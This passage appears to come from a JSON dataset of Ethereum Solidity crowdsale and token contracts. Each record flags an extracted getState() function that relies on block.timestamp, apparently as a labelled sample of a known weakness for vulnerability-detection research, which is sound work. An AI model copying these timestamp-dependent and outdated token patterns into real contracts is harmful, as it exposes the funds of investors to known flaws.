ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ec6"
  },
  "filename": "10552.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ec7"
  },
  "filename": "10559.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract HoldToken is MintableToken {\n using SafeMath for uint256;\n string public name = 'HOLD';\n string public symbol = 'HOLD';\n uint8 public decimals = 18;\n event Burn(address indexed burner, uint256 value);\n event BurnTransferred(address indexed previousBurner, address indexed newBurner);\n address burnerRole;\n modifier onlyBurner() {\n require(msg.sender == burnerRole);\n _;\n }\n function HoldToken(address _burner) public {\n burnerRole = _burner;\n }\n function transferBurnRole(address newBurner) public onlyBurner {\n require(newBurner != address(0));\n BurnTransferred(burnerRole, newBurner);\n burnerRole = newBurner;\n }\n function burn(uint256 _value) public onlyBurner {\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n Burn(msg.sender, _value);\n Transfer(msg.sender, address(0), _value);\n }\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n HoldToken public token;\n uint256 public startTime;\n uint256 public endTime;\n uint256 public rate;\n address public wallet;\n uint256 public weiRaised;\n event TokenPurchase(address indexed beneficiary, uint256 indexed value, uint256 indexed amount, uint256 transactionId);\n function Crowdsale(\n uint256 _startTime,\n uint256 _endTime,\n uint256 _rate,\n address _wallet,\n uint256 _initialWeiRaised\n ) public {\n require(_startTime >= now);\n require(_endTime >= _startTime);\n require(_wallet != address(0));\n require(_rate > 0);\n token = new HoldToken(_wallet);\n startTime = _startTime;\n endTime = _endTime;\n rate = _rate;\n wallet = _wallet;\n weiRaised = _initialWeiRaised;\n }\n function hasEnded() public view returns (bool) {\n return now > endTime;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n assert(token.transferFrom(from, to, 